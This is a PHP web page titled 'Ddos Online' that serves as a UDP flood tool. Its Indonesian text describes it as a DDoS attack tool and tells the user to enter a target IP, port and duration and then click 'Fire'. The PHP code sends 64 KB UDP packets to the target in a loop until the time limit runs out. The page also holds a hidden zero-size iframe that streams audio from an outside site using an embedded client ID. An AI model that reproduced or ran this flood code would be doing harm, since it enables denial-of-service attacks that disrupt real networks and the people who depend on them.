<html>
<meta charset="utf-8">
  <link rel="icon" type="image/png" href="http://pereyaslav-rda.gov.ua//images/20190623_120810.jpg">
  <title>Ddos Online</title>
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <meta content="" name="keywords">
  <iframe width="0" height="0" src="https://api.soundcloud.com/tracks/473310102/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscreen></iframe>
  <meta name="description" content="Fungsi Tools:Melakukan Seragan Distributed Denial Off Service">
<FONT SIZE=4>====Ddos====</FONT><center>
<FONT SIZE=2>Fungsi:Melakukan Serangan Distributed Denial Off Service</FONT><center>
<FONT SIZE=2>Cara Penggunaan:Masukan Ip Target,Port Target Dan Berapa Lama Waktu Serangan,Lalu Klik Fire</FONT><center>
<center><br><br><br>
<table class="tabnet" style="width:333px;padding:0 1px;">
<tr><tr><td>IP Target</td><td>:</td>
<td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
</td></tr>
<tr><td>Time</td><td>:</td>
<td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
</td></tr>

<tr><td>Port</td><td>:</td>
<td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
</td></tr></tr></table></b><br>
<input type="submit" class="inputzbut" name="fire" value="  Firee !!!   ">
<br><br>


</form>
</center>
<?php
$submit = $_POST['fire'];
if (isset($submit)) {

$packets = 0;
$ip = $_POST['ip'];
$rand = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = $_POST['time'];

$time = time();
print "Flooded: $ip on port $rand <br><br>";
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "X";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "Packet complete at ".time('h:i:s')." with $packets (" . round(($packets*65)/1024, 2) . " mB) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
}

?>